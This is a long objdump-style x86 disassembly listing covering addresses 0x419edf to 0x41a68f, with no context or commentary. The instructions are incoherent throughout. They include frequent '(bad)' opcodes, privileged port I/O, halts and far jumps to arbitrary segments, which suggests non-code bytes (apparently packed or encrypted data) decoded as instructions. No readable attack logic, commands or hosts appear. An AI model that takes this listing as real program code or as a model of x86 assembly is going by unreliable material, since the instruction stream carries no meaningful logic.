  419edf:	jb     0x419ea0
  419ee1:	jle    0x419f4a
  419ee3:	sbb    DWORD PTR [ecx+0x1c9403f7],edi
  419ee9:	ja     0x419f4f
  419eeb:	loopne 0x419eb1
  419eed:	jle    0x419eec
  419eef:	adc    al,0x7c
  419ef1:	mov    al,ds:0xa65a4b51
  419ef6:	loop   0x419ee1
  419ef8:	dec    edx
  419ef9:	xor    eax,0x96496338
  419efe:	in     eax,dx
  419eff:	add    al,0xdf
  419f01:	aad    0x7f
  419f03:	test   eax,0xcce0f705
  419f08:	popf   
  419f09:	adc    al,0xaf
  419f0b:	mov    DWORD PTR [edi],edi
  419f0d:	fiadd  WORD PTR [ebp+0x6107214b]
  419f13:	inc    ebp
  419f14:	mov    edx,0xd415a35d
  419f19:	es das 
  419f1b:	mov    ebx,0xa1df79aa
  419f20:	(bad)  
  419f21:	pushf  
  419f22:	mov    bl,0xb0
  419f24:	dec    DWORD PTR ds:0x4700b3cf
  419f2a:	retf   
  419f2b:	sahf   
  419f2c:	dec    ebx
  419f2d:	cmc    
  419f2e:	out    0xbc,eax
  419f30:	xchg   esp,eax
  419f31:	fimul  WORD PTR [esi]
  419f33:	inc    edx
  419f34:	jb     0x419f65
  419f36:	mov    ch,0x8
  419f38:	out    dx,eax
  419f39:	mov    eax,ds:0x36c7806b
  419f3e:	loop   0x419ece
  419f40:	pop    esi
  419f41:	xchg   ebx,eax
  419f42:	call   0x9f69253a
  419f47:	clc    
  419f48:	gs cmp eax,0x3d855c62
  419f4e:	push   0xb5f92efc
  419f53:	push   cs
  419f54:	shl    esp,1
  419f56:	pop    eax
  419f57:	adc    eax,ebp
  419f59:	pop    esp
  419f5a:	mov    ah,0x9d
  419f5c:	inc    ebp
  419f5d:	mov    cl,BYTE PTR [edx]
  419f5f:	mov    bh,0xfc
  419f61:	pop    ebx
  419f62:	das    
  419f63:	push   ss
  419f64:	or     BYTE PTR [ecx+ecx*4+0x6f2ec610],dl
  419f6b:	inc    ecx
  419f6c:	xchg   esi,eax
  419f6d:	and    eax,0xf4639111
  419f72:	dec    ebp
  419f73:	mov    ebx,0x8e7d8847
  419f78:	hlt    
  419f79:	dec    ebp
  419f7a:	push   ebp
  419f7b:	loop   0x419f4e
  419f7d:	mov    al,0x45
  419f7f:	pop    esp
  419f80:	sar    BYTE PTR [ecx],1
  419f82:	jg     0x419fd6
  419f84:	xor    eax,0x13d06d59
  419f89:	repz pop ss
  419f8b:	add    DWORD PTR [ebp+esi*8+0x3b2f80fa],eax
  419f92:	mov    cl,0xeb
  419f94:	in     ax,dx
  419f96:	add    al,0xa9
  419f98:	sub    BYTE PTR [eax+0xe9bc861],bh
  419f9e:	call   0xd62de41a
  419fa3:	test   DWORD PTR [esi-0x52bda95a],ebx
  419fa9:	shr    ebp,0x50
  419fac:	add    BYTE PTR [ebp+edx*2-0xca22d11],ah
  419fb3:	test   BYTE PTR [ebp-0x61],dh
  419fb6:	jne    0x419fd2
  419fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fb9:	add    eax,0x38cd6792
  419fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbf:	dec    esp
  419fc0:	sbb    ebp,edx
  419fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc3:	jae    0x419ff8
  419fc5:	stos   BYTE PTR es:[edi],al
  419fc6:	loopne 0x41a00b
  419fc8:	adc    eax,0x5152f414
  419fcd:	jo     0x41a02b
  419fcf:	shl    BYTE PTR [ebp+0x666082cf],1
  419fd5:	fldenv ds:0x39395ea1
  419fdb:	pop    ebx
  419fdc:	jle    0x41a05a
  419fde:	xchg   DWORD PTR [esi+0x12722fc3],ecx
  419fe4:	mov    ebp,0x3ccd90b1
  419fe9:	(bad)  
  419fea:	jg     0x419fe9
  419fec:	sbb    BYTE PTR [edx+edi*1+0x2b],dl
  419ff0:	out    dx,eax
  419ff1:	sti    
  419ff2:	add    al,0x19
  419ff4:	out    dx,eax
  419ff5:	push   0xfffffffd
  419ff7:	sbb    eax,0x43b1a728
  419ffc:	or     al,0x3d
  419ffe:	push   esp
  419fff:	push   ds
  41a000:	call   0x5c58:0xa4e3dd0e
  41a007:	mov    esp,esi
  41a009:	das    
  41a00a:	(bad)  
  41a00b:	shr    BYTE PTR [esi-0x45],cl
  41a00e:	push   esi
  41a00f:	ss mov edx,0xf073e48
  41a015:	repnz imul ebp,DWORD PTR [edx-0x2d],0x32bddf48
  41a01d:	fnstenv [ebp+ecx*4-0x12620f96]
  41a024:	dec    ecx
  41a025:	rol    BYTE PTR [edi+0x10f734f1],1
  41a02b:	test   eax,0x2128cd1c
  41a030:	test   al,0x40
  41a032:	repnz and edx,esp
  41a035:	(bad)  
  41a036:	shl    BYTE PTR [edx],cl
  41a038:	lahf   
  41a039:	in     eax,dx
  41a03a:	int    0xed
  41a03c:	pop    ss
  41a03d:	int    0x6d
  41a03f:	mov    esi,0x7128f678
  41a044:	fs inc edi
  41a046:	pop    ecx
  41a047:	(bad)  
  41a048:	or     DWORD PTR [edx+ebp*1+0x38],ecx
  41a04c:	cli    
  41a04d:	cli    
  41a04e:	or     al,0x38
  41a050:	repnz pop ecx
  41a052:	sub    ebx,DWORD PTR [edi+0x74fdd2d2]
  41a058:	jl     0x41a019
  41a05a:	and    bh,BYTE PTR [edx+ebp*8+0x15]
  41a05e:	lds    esi,FWORD PTR [esi]
  41a060:	inc    eax
  41a061:	jg     0x41a08d
  41a063:	in     eax,dx
  41a064:	in     al,0x12
  41a066:	dec    eax
  41a067:	rol    BYTE PTR [ebx],0x8a
  41a06a:	adc    al,0x8a
  41a06c:	jp     0x41a02b
  41a06e:	sbb    BYTE PTR ds:0x55d55e0b,dh
  41a074:	add    ecx,ebp
  41a076:	in     eax,dx
  41a077:	sub    ebx,eax
  41a079:	mov    dl,0xbd
  41a07b:	jmp    0xa25b:0x3d1e1198
  41a082:	push   ebp
  41a083:	out    0x7c,al
  41a085:	xlat   BYTE PTR ds:[ebx]
  41a086:	fs mov ecx,0xb35d055e
  41a08c:	and    bh,BYTE PTR [esi+0x6365a2d5]
  41a092:	loope  0x41a078
  41a094:	jno    0x41a0ae
  41a096:	jb     0x41a05a
  41a098:	push   eax
  41a099:	push   edx
  41a09a:	pop    es
  41a09b:	jl     0x41a0d2
  41a09d:	mov    al,0x2f
  41a09f:	rcl    bl,cl
  41a0a1:	pusha  
  41a0a2:	call   0x51e9:0xd22face4
  41a0a9:	retf   
  41a0aa:	sub    al,0xb7
  41a0ac:	sub    esi,DWORD PTR [eax+edx*8]
  41a0af:	xchg   edx,eax
  41a0b0:	xor    DWORD PTR [eax-0x40],ebp
  41a0b3:	dec    esi
  41a0b4:	pop    ds
  41a0b5:	adc    al,0xdd
  41a0b7:	in     al,0x75
  41a0b9:	pop    es
  41a0ba:	push   0x8f961998
  41a0bf:	inc    edx
  41a0c0:	test   eax,0x5aeab613
  41a0c5:	jo     0x41a13d
  41a0c7:	mov    edx,DWORD PTR [ebx+0x5]
  41a0ca:	dec    DWORD PTR [eax]
  41a0cc:	dec    ebx
  41a0cd:	xchg   ebx,eax
  41a0ce:	adc    eax,0x53
  41a0d1:	cmp    dl,BYTE PTR [edx-0x80]
  41a0d4:	jno    0x41a109
  41a0d6:	jnp    0x41a13d
  41a0d8:	outs   dx,BYTE PTR ds:[esi]
  41a0d9:	repz adc ah,BYTE PTR [edi]
  41a0dc:	jg     0x41a0f3
  41a0de:	jmp    0x54351c16
  41a0e3:	or     eax,0xd5ce5e7e
  41a0e8:	stc    
  41a0e9:	xchg   edx,eax
  41a0ea:	pop    esp
  41a0eb:	jecxz  0x41a073
  41a0ed:	cdq    
  41a0ee:	fcomp  QWORD PTR [ecx]
  41a0f0:	jo     0x41a107
  41a0f2:	inc    esi
  41a0f3:	pusha  
  41a0f4:	sub    BYTE PTR [esi+eiz*8],ch
  41a0f7:	adc    BYTE PTR [esi+0x13e78fd4],dl
  41a0fd:	sti    
  41a0fe:	std    
  41a0ff:	sbb    ebx,edi
  41a101:	scas   al,BYTE PTR es:[edi]
  41a102:	out    dx,al
  41a103:	data16 lahf 
  41a105:	mov    edx,0x803e484d
  41a10a:	add    DWORD PTR [edx-0x3a],edx
  41a10d:	mov    eax,ds:0xfa6db3f
  41a112:	not    DWORD PTR [ebp*2+0x52c24d14]
  41a119:	mov    dh,0x17
  41a11b:	ss push esi
  41a11d:	test   al,0x82
  41a11f:	inc    eax
  41a120:	inc    esi
  41a121:	mov    ebx,0xfd4527dc
  41a126:	mov    ebp,0x6a900115
  41a12b:	das    
  41a12c:	mov    ds:0xa4f5e64b,eax
  41a131:	retf   
  41a132:	inc    edi
  41a133:	xchg   ebp,eax
  41a134:	dec    ebp
  41a135:	pop    es
  41a136:	jb     0x41a15a
  41a138:	or     al,0x8e
  41a13a:	mov    ah,ah
  41a13c:	idiv   edi
  41a13e:	dec    ebx
  41a13f:	pusha  
  41a140:	mov    dl,0x4e
  41a143:	add    al,0x28
  41a145:	pop    edi
  41a146:	test   al,0x85
  41a148:	mov    ecx,0x1945e3ea
  41a14d:	xor    bh,0x56
  41a150:	and    eax,0x3149b97a
  41a155:	cld    
  41a156:	pushf  
  41a157:	sub    DWORD PTR [ebx],edi
  41a159:	mov    dl,0x27
  41a15b:	sbb    edi,DWORD PTR [edi]
  41a15d:	(bad)  
  41a15f:	mov    edx,0x4f81f9c6
  41a164:	cld    
  41a165:	push   ss
  41a166:	adc    eax,0x94e35425
  41a16b:	jns    0x41a141
  41a16d:	mov    ds:0xbc129dd0,eax
  41a172:	or     DWORD PTR gs:[eax+edx*8+0x3bb7bcba],0x60
  41a17b:	dec    ecx
  41a17c:	push   esi
  41a17d:	mov    ds:0x8215a9fb,al
  41a182:	jno    0x41a15c
  41a184:	or     DWORD PTR [eax-0x52e1e5bb],edx
  41a18a:	push   ebp
  41a18b:	sub    ebx,0xf91d8774
  41a191:	sbb    ebx,edx
  41a193:	xchg   BYTE PTR [edi+0x3b],dl
  41a196:	mov    ecx,0x540559a3
  41a19b:	sbb    ebp,0x72f4422c
  41a1a1:	push   es
  41a1a2:	mov    ch,0x25
  41a1a4:	das    
  41a1a5:	fidivr WORD PTR [ecx]
  41a1a7:	push   ebp
  41a1a8:	out    0xe5,al
  41a1aa:	xchg   esi,eax
  41a1ab:	pop    ebp
  41a1ac:	and    BYTE PTR [edx+0x11aaea56],ch
  41a1b2:	cmp    bl,BYTE PTR [edx+0x37e571a1]
  41a1b8:	mov    edi,0x8d1a6b3b
  41a1bd:	add    BYTE PTR [eax],ch
  41a1bf:	xor    BYTE PTR [edi+0x71],bl
  41a1c2:	stos   BYTE PTR es:[edi],al
  41a1c3:	lahf   
  41a1c4:	mov    ds:0xa6c596ab,al
  41a1c9:	push   esi
  41a1ca:	add    ah,BYTE PTR [edx-0x11ad2e1a]
  41a1d0:	xor    BYTE PTR [edi+0x2f],dl
  41a1d3:	cmp    bh,bh
  41a1d5:	or     BYTE PTR [ecx+eax*1+0x252a676e],al
  41a1dc:	aaa    
  41a1dd:	aas    
  41a1de:	sbb    eax,0x8902b48f
  41a1e3:	jmp    0x76235de1
  41a1e8:	outs   dx,BYTE PTR ds:[esi]
  41a1e9:	bound  edi,QWORD PTR [edi+0x786159f2]
  41a1ef:	push   ebx
  41a1f0:	(bad)  
  41a1f2:	unpcklps xmm0,XMMWORD PTR [esi]
  41a1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1f6:	pcmpgtd mm5,QWORD PTR [edi-0x56e60f7]
  41a1fd:	or     dl,BYTE PTR [ecx-0x3b458200]
  41a203:	retf   0xa1ee
  41a206:	sbb    edi,ecx
  41a208:	sub    cl,BYTE PTR es:[esi+0x1e]
  41a20c:	mov    ds:0x1591ef3c,al
  41a211:	aas    
  41a212:	xchg   BYTE PTR [ecx],ch
  41a214:	mov    al,ds:0x2ed16fe8
  41a219:	fs push ebp
  41a21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a21c:	mov    al,0xdc
  41a21e:	mov    BYTE PTR [ebx*2+0x7497efb5],ch
  41a225:	add    BYTE PTR [esp+ebx*4],cl
  41a228:	push   eax
  41a229:	or     al,0xd9
  41a22b:	push   ebp
  41a22c:	std    
  41a22d:	shl    BYTE PTR [edi],1
  41a22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a230:	xor    ch,BYTE PTR [ebx-0x7d7cf7b6]
  41a236:	mov    cl,0xc4
  41a238:	jg     0x41a280
  41a23a:	shr    dh,0xb4
  41a23d:	jmp    0x41a293
  41a23f:	neg    al
  41a241:	xor    eax,0xdeab12c4
  41a246:	fidivr DWORD PTR [ebx+0x46ca88a3]
  41a24c:	ror    BYTE PTR [esi+0x616077ca],0x89
  41a253:	add    eax,0xd3d9bf64
  41a258:	xor    eax,0x46
  41a25b:	popf   
  41a25c:	cmp    BYTE PTR [ebp-0x1fccf21b],dl
  41a262:	inc    ebp
  41a263:	mov    al,ds:0x5cf76ca9
  41a268:	cwde   
  41a269:	mov    edi,0xd4510461
  41a26e:	inc    edi
  41a26f:	stos   DWORD PTR es:[edi],eax
  41a270:	jp     0x41a229
  41a272:	mov    ch,0xef
  41a274:	jmp    0x41a2f4
  41a276:	sub    eax,0x569b3933
  41a27b:	or     ebp,edx
  41a27d:	inc    ebp
  41a27e:	add    BYTE PTR [esi-0x5494e200],0xf8
  41a285:	xor    DWORD PTR ds:0x917c990b,ecx
  41a28b:	pop    eax
  41a28c:	(bad)  
  41a28d:	stos   DWORD PTR es:[edi],eax
  41a28e:	fdiv   QWORD PTR ds:0x5e336824
  41a294:	cld    
  41a295:	mov    edx,eax
  41a297:	or     al,0x96
  41a299:	lods   al,BYTE PTR ds:[esi]
  41a29a:	dec    ebp
  41a29b:	aam    0x1b
  41a29d:	popa   
  41a29e:	test   eax,0x8eb906ff
  41a2a3:	inc    edi
  41a2a4:	test   BYTE PTR [ecx+0x5b7f69a0],dl
  41a2aa:	cli    
  41a2ab:	xor    DWORD PTR [esi-0x1303fc1f],0x62ef589f
  41a2b5:	pop    esi
  41a2b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2b7:	bound  ecx,QWORD PTR [esi]
  41a2b9:	cmp    eax,0x1651eeaa
  41a2be:	mov    ah,0xdf
  41a2c0:	add    ebp,esi
  41a2c2:	ds mov bh,0xde
  41a2c5:	xorps  xmm0,xmm5
  41a2c8:	add    cl,BYTE PTR [esi]
  41a2ca:	das    
  41a2cb:	test   al,0x47
  41a2cd:	add    al,BYTE PTR [edx]
  41a2cf:	jns    0x41a2e4
  41a2d1:	cmp    ch,bh
  41a2d3:	jge    0x41a2e6
  41a2d5:	pop    eax
  41a2d6:	pop    eax
  41a2d7:	push   ecx
  41a2d8:	retf   
  41a2d9:	jae    0x41a2c1
  41a2db:	sbb    DWORD PTR [esi],edx
  41a2dd:	jb     0x41a296
  41a2df:	add    ebx,ebp
  41a2e1:	inc    ebp
  41a2e2:	add    al,0x95
  41a2e4:	aas    
  41a2e5:	mov    WORD PTR ds:0x3b250c20,es
  41a2eb:	(bad)  
  41a2ed:	xchg   ecx,eax
  41a2ee:	leave  
  41a2ef:	mov    esi,0x8b3ae56f
  41a2f4:	ret    0xfb5
  41a2f7:	test   al,0x26
  41a2f9:	jg     0x41a2a9
  41a2fb:	jecxz  0x41a2d8
  41a2fd:	mov    es,WORD PTR [ecx+0x5edc040c]
  41a303:	ficom  WORD PTR [edx-0x1a945ba4]
  41a309:	mov    ch,0xe4
  41a30b:	cmp    DWORD PTR [edx],ebp
  41a30d:	gs inc esp
  41a30f:	ss push cs
  41a311:	add    BYTE PTR [edi],cl
  41a313:	or     bh,dh
  41a315:	jl     0x41a30f
  41a317:	repz ds cdq 
  41a31a:	jg     0x41a387
  41a31c:	push   edi
  41a31d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a31e:	add    al,0x9d
  41a320:	out    0x4,eax
  41a322:	out    0xca,al
  41a324:	xor    eax,0xa6026060
  41a329:	stos   DWORD PTR es:[edi],eax
  41a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a32b:	or     BYTE PTR [ecx+0x7a],bh
  41a32e:	xchg   ecx,eax
  41a32f:	cwde   
  41a330:	mov    esp,0xb0a9620b
  41a335:	sub    al,0xd0
  41a337:	pop    ebp
  41a338:	(bad)
  41a33b:	clc    
  41a33c:	jle    0x41a338
  41a33e:	test   DWORD PTR [ecx],esi
  41a340:	aad    0xb5
  41a342:	push   DWORD PTR [ecx]
  41a344:	lea    esp,[edx]
  41a346:	lds    eax,FWORD PTR [ecx]
  41a348:	xchg   ebp,eax
  41a349:	add    DWORD PTR [ebx+0xd4d8621],esi
  41a34f:	pop    ss
  41a350:	stos   DWORD PTR es:[edi],eax
  41a351:	fdivr  st(2),st
  41a353:	sbb    BYTE PTR [edx+0x45efbb08],bl
  41a359:	pop    eax
  41a35a:	(bad)  
  41a35b:	(bad)  [ebx+0x39]
  41a35e:	xchg   ebx,eax
  41a35f:	cdq    
  41a360:	fistp  QWORD PTR [ebp-0x2b8c7f84]
  41a366:	ds mov ebp,0x9230c4d0
  41a36c:	in     al,0xeb
  41a36e:	test   ch,cl
  41a370:	pop    ebp
  41a371:	icebp  
  41a372:	mov    bl,BYTE PTR [esi-0x7d58b839]
  41a378:	inc    esp
  41a379:	lahf   
  41a37a:	int3   
  41a37b:	lahf   
  41a37c:	pop    esi
  41a37d:	or     ebp,eax
  41a37f:	inc    edx
  41a380:	or     eax,0xf12ea958
  41a385:	sbb    edi,edx
  41a387:	and    edx,DWORD PTR [ebp-0x4a]
  41a38a:	cld    
  41a38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a38c:	push   0x2316bc14
  41a391:	ins    DWORD PTR es:[edi],dx
  41a392:	ins    DWORD PTR es:[edi],dx
  41a393:	jecxz  0x41a390
  41a395:	mov    edi,0xe4891d30
  41a39a:	repz add cl,BYTE PTR [ecx-0x24fc7fed]
  41a3a1:	mov    DWORD PTR [edi+0x42],ebx
  41a3a4:	adc    edx,ecx
  41a3a6:	mov    dl,0xa
  41a3a8:	leave  
  41a3a9:	dec    edi
  41a3aa:	jmp    0x41a347
  41a3ac:	sbb    BYTE PTR [ebx+0x50],dl
  41a3af:	mov    dl,0xad
  41a3b1:	std    
  41a3b2:	and    bl,bh
  41a3b4:	leave  
  41a3b5:	data16 out dx,al
  41a3b7:	mov    esi,ecx
  41a3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ba:	xchg   ecx,eax
  41a3bb:	pushf  
  41a3bc:	(bad)  
  41a3bd:	ss (bad) 
  41a3bf:	pushf  
  41a3c0:	adc    al,0xeb
  41a3c2:	add    BYTE PTR [eax],ch
  41a3c4:	jge    0x41a3ce
  41a3c6:	xor    BYTE PTR [eax+0x7e040354],ah
  41a3cc:	inc    ebx
  41a3cd:	pop    ss
  41a3ce:	push   es
  41a3cf:	and    DWORD PTR [edx-0x7e],0x80dc25ee
  41a3d6:	stos   BYTE PTR es:[edi],al
  41a3d7:	mov    eax,0xaba93712
  41a3dc:	dec    ebx
  41a3dd:	dec    esp
  41a3de:	sub    BYTE PTR [esi],bh
  41a3e0:	adc    eax,0x38075ef7
  41a3e5:	dec    ecx
  41a3e6:	jno    0x41a459
  41a3e8:	mov    bl,0x6c
  41a3ea:	add    eax,0x76463cc3
  41a3ef:	ror    BYTE PTR [eax+0xe],1
  41a3f2:	jge    0x41a407
  41a3f4:	jo     0x41a388
  41a3f6:	inc    ebx
  41a3f7:	xchg   edx,eax
  41a3f8:	mov    edx,0xa01c2f33
  41a3fd:	cmc    
  41a3fe:	loop   0x41a3a0
  41a400:	shl    edi,1
  41a402:	rcl    edx,0x61
  41a405:	adc    ecx,0x44effc56
  41a40b:	rcr    ch,cl
  41a40d:	retf   0xab22
  41a410:	push   ss
  41a411:	cmp    al,0x16
  41a413:	sbb    DWORD PTR [esi],esp
  41a415:	jp     0x41a44a
  41a417:	pop    esi
  41a418:	mov    ds:0x33a319e9,eax
  41a41d:	repnz out dx,eax
  41a41f:	mov    BYTE PTR [edi+0x444128df],al
  41a425:	push   edx
  41a426:	loopne 0x41a3c7
  41a428:	sub    DWORD PTR [edx],ebp
  41a42a:	adc    ecx,DWORD PTR [edi]
  41a42c:	or     ecx,DWORD PTR [edi+0x318ba10a]
  41a432:	fisub  DWORD PTR [ecx]
  41a434:	repnz adc DWORD PTR [eax],ecx
  41a437:	adc    eax,DWORD PTR [ecx-0x7cec36c4]
  41a43d:	ins    DWORD PTR es:[edi],dx
  41a43e:	push   esp
  41a43f:	inc    esi
  41a440:	aam    0x7
  41a442:	(bad)  
  41a443:	and    BYTE PTR [edx],bh
  41a445:	and    bh,dl
  41a447:	rol    cl,cl
  41a449:	sbb    DWORD PTR ds:0x11f070c,ebp
  41a44f:	jno    0x41a42d
  41a451:	leave  
  41a452:	sbb    edi,DWORD PTR [esi-0x29]
  41a455:	dec    ebx
  41a456:	in     al,0x14
  41a458:	ins    BYTE PTR es:[edi],dx
  41a459:	inc    esi
  41a45a:	ja     0x41a3f1
  41a45c:	scas   eax,DWORD PTR es:[edi]
  41a45d:	in     al,dx
  41a45e:	fwait
  41a45f:	push   esi
  41a460:	rcr    DWORD PTR [eax+0x1d],1
  41a463:	std    
  41a464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a465:	loop   0x41a489
  41a467:	and    bl,al
  41a469:	sti    
  41a46a:	and    BYTE PTR [ecx+0x5b578677],ch
  41a470:	pushf  
  41a471:	das    
  41a472:	adc    DWORD PTR [edx+edx*2-0x68f7ed13],eax
  41a479:	xchg   edi,eax
  41a47a:	xor    eax,ebx
  41a47c:	mov    edx,0xf54bb83f
  41a481:	or     DWORD PTR [edx],0xffffffb3
  41a484:	ins    BYTE PTR es:[edi],dx
  41a485:	shr    BYTE PTR [eax+ebx*8-0x6be2bdd2],0x39
  41a48d:	lds    ecx,FWORD PTR [esi+eax*8]
  41a490:	jle    0x41a45c
  41a492:	fwait
  41a493:	mov    edx,0x18ed7301
  41a498:	out    dx,al
  41a499:	xchg   ch,ch
  41a49b:	push   ds
  41a49c:	das    
  41a49d:	jge    0x41a4fc
  41a49f:	cmc    
  41a4a0:	ror    BYTE PTR [edi+0x35f15c68],cl
  41a4a6:	push   ss
  41a4a7:	sub    ch,BYTE PTR [edi]
  41a4a9:	sub    edi,ecx
  41a4ab:	retf   
  41a4ac:	stc    
  41a4ad:	jle    0x41a4d7
  41a4af:	dec    esp
  41a4b0:	jmp    0x4dda0072
  41a4b5:	sbb    al,0x7d
  41a4b8:	push   ebx
  41a4b9:	es scas al,BYTE PTR es:[edi]
  41a4bb:	sti    
  41a4bc:	mul    DWORD PTR [ebx+0x44]
  41a4bf:	mov    ebx,0x56861dd0
  41a4c4:	add    DWORD PTR [ebp+0x3a1eb338],ecx
  41a4ca:	mov    ecx,edx
  41a4cc:	into   
  41a4cd:	clc    
  41a4ce:	pop    esp
  41a4cf:	fs sbb ecx,edi
  41a4d2:	fucom  st(1)
  41a4d4:	ins    DWORD PTR es:[edi],dx
  41a4d5:	inc    edi
  41a4d6:	ins    DWORD PTR es:[edi],dx
  41a4d7:	xchg   ecx,eax
  41a4d8:	push   ebx
  41a4d9:	outs   dx,DWORD PTR ds:[esi]
  41a4da:	jp     0x41a474
  41a4dc:	mov    edx,0x103f353b
  41a4e1:	out    0x3c,al
  41a4e3:	test   BYTE PTR [esi-0x80],ch
  41a4e6:	mov    ecx,0x9b8cf8f6
  41a4eb:	jne    0x41a4dd
  41a4ed:	aas    
  41a4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4ef:	stos   DWORD PTR es:[edi],eax
  41a4f0:	fs push esp
  41a4f2:	push   ebp
  41a4f3:	xor    ch,BYTE PTR [ebx+0x1ff56279]
  41a4f9:	push   ss
  41a4fa:	cli    
  41a4fb:	test   DWORD PTR [ecx+0x792e3bdb],edi
  41a501:	mov    dh,0xc
  41a503:	inc    ebp
  41a504:	enter  0xf812,0xa1
  41a508:	ds mov edx,0xd48ab79d
  41a50e:	sbb    ch,cl
  41a510:	cwde   
  41a511:	or     ebx,DWORD PTR [eax+0x596083ab]
  41a517:	and    eax,0xe2b79738
  41a51c:	inc    ecx
  41a51d:	pop    eax
  41a51e:	adc    edx,DWORD PTR [edi-0x52]
  41a521:	pop    ebx
  41a522:	cmp    bh,bl
  41a524:	das    
  41a525:	das    
  41a526:	xor    bh,BYTE PTR [di-0x62]
  41a52a:	push   eax
  41a52b:	and    eax,0x81b82c4d
  41a530:	cmp    ebp,DWORD PTR [edx-0x4766068a]
  41a536:	jg     0x41a4f4
  41a538:	jg     0x41a576
  41a53a:	add    eax,0x51f44bcd
  41a53f:	int    0x93
  41a541:	xor    BYTE PTR [esi-0x7a0bd7ff],dh
  41a547:	jmp    0x41a537
  41a549:	or     DWORD PTR [ecx-0x12],0xa833ae0d
  41a550:	ret    0x3c3d
  41a553:	mov    DWORD PTR [esi-0x4f2305ee],edx
  41a559:	xor    cl,bh
  41a55b:	or     al,0x53
  41a55d:	clc    
  41a55e:	and    bl,cl
  41a560:	lods   eax,DWORD PTR ds:[esi]
  41a561:	xor    ah,BYTE PTR [ecx-0x6e29e6f6]
  41a567:	(bad)  
  41a568:	cmp    DWORD PTR [ebp+ebp*8-0x43],eax
  41a56c:	das    
  41a56d:	(bad)  
  41a56e:	in     al,dx
  41a56f:	outs   dx,BYTE PTR ds:[esi]
  41a570:	or     al,0xb1
  41a572:	inc    BYTE PTR [ecx+edx*2-0x2]
  41a576:	scas   eax,DWORD PTR es:[edi]
  41a577:	xchg   DWORD PTR [edi-0x789576de],edi
  41a57d:	or     eax,0x37872c30
  41a582:	mov    ah,0x9
  41a584:	mov    dh,0x68
  41a586:	lahf   
  41a587:	push   ebp
  41a588:	pop    ecx
  41a589:	sbb    BYTE PTR [eax+ebx*1],0x85
  41a58d:	mov    ecx,0x39086a
  41a592:	imul   ebx,DWORD PTR [ecx-0x554d13de],0x51c94f87
  41a59c:	fs jno 0x41a5d2
  41a59f:	(bad)  
  41a5a0:	jmp    0x7083fb5d
  41a5a5:	outs   dx,DWORD PTR ds:[esi]
  41a5a6:	cdq    
  41a5a7:	mov    edi,0x89171c94
  41a5ac:	mov    ebx,0x20225e4f
  41a5b1:	add    edx,ebx
  41a5b3:	fisttp QWORD PTR [edx-0xb]
  41a5b6:	mov    WORD PTR [bp+di-0x6f],ss
  41a5ba:	push   ds
  41a5bb:	mov    esp,0x3bc57b7
  41a5c0:	pop    ss
  41a5c1:	bound  esp,QWORD PTR [edi+0x5f27343a]
  41a5c7:	lods   eax,DWORD PTR ds:[esi]
  41a5c8:	stos   BYTE PTR es:[di],al
  41a5ca:	xor    BYTE PTR [esi+0x3c],dl
  41a5cd:	ja     0x41a5c4
  41a5cf:	inc    ebx
  41a5d0:	stos   DWORD PTR es:[edi],eax
  41a5d1:	jmp    0x6f:0x7b0e6029
  41a5d8:	and    eax,0x16edd373
  41a5dd:	int3   
  41a5de:	ret    0x95b8
  41a5e1:	pop    ecx
  41a5e2:	imul   ebx,DWORD PTR [ebp-0x7e8809d1],0x4c931dd1
  41a5ec:	or     dh,bl
  41a5ee:	stos   DWORD PTR es:[edi],eax
  41a5ef:	mov    ebx,0x557a372a
  41a5f4:	fisub  DWORD PTR [ecx+0x6]
  41a5f7:	mov    esi,0xbf634f81
  41a5fc:	mov    WORD PTR [esi+edi*8],ss
  41a5ff:	xor    ch,dh
  41a601:	scas   eax,DWORD PTR es:[edi]
  41a602:	test   DWORD PTR [edx-0x6fe25d11],ebp
  41a608:	mov    BYTE PTR cs:[esi-0x606d15a3],bl
  41a60f:	std    
  41a610:	sbb    eax,0xe96e8dac
  41a615:	lock add eax,0x606a7599
  41a61b:	mov    ss,WORD PTR [ecx+0x7b]
  41a61e:	cld    
  41a61f:	sub    al,BYTE PTR [esi]
  41a621:	stc    
  41a622:	jmp    0xf369:0x1d7aae02
  41a629:	jecxz  0x41a65d
  41a62b:	xlat   BYTE PTR ds:[ebx]
  41a62c:	outs   dx,BYTE PTR ds:[esi]
  41a62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62f:	mov    dl,0x6b
  41a631:	pop    edi
  41a632:	idiv   DWORD PTR [eax+0x4]
  41a635:	sub    ah,bh
  41a637:	xor    BYTE PTR [edx+edi*2],bl
  41a63a:	add    BYTE PTR [ebp-0xd],cl
  41a63d:	adc    al,0x38
  41a63f:	adc    DWORD PTR [eax+edx*8],edx
  41a642:	add    al,0xd0
  41a644:	add    eax,DWORD PTR [edi-0x56e57b89]
  41a64a:	mov    ebx,0x789ff8d2
  41a64f:	icebp  
  41a650:	ret    0xc40
  41a653:	out    0x9b,eax
  41a655:	xabort 0xdc
  41a658:	sbb    dh,dh
  41a65a:	into   
  41a65b:	stc    
  41a65c:	cmp    DWORD PTR [eax+eax*8-0x18273ec2],edx
  41a663:	in     eax,0xc1
  41a665:	icebp  
  41a666:	iret   
  41a667:	ja     0x41a64b
  41a669:	mov    BYTE PTR [edx-0x5fafe9b4],dl
  41a66f:	lods   al,BYTE PTR ds:[esi]
  41a670:	enter  0x255b,0xcf
  41a674:	or     ah,cl
  41a676:	sbb    BYTE PTR [edi+0x40],dl
  41a679:	adc    al,bh
  41a67b:	sub    DWORD PTR [ebp+0x55f97f65],edx
  41a681:	add    bl,ch
  41a683:	call   0x3380:0x21c252fa
  41a68a:	sar    ah,0x1
  41a68d:	je     0x41a6ee
  41a68f:	loopne 0x41a6b5
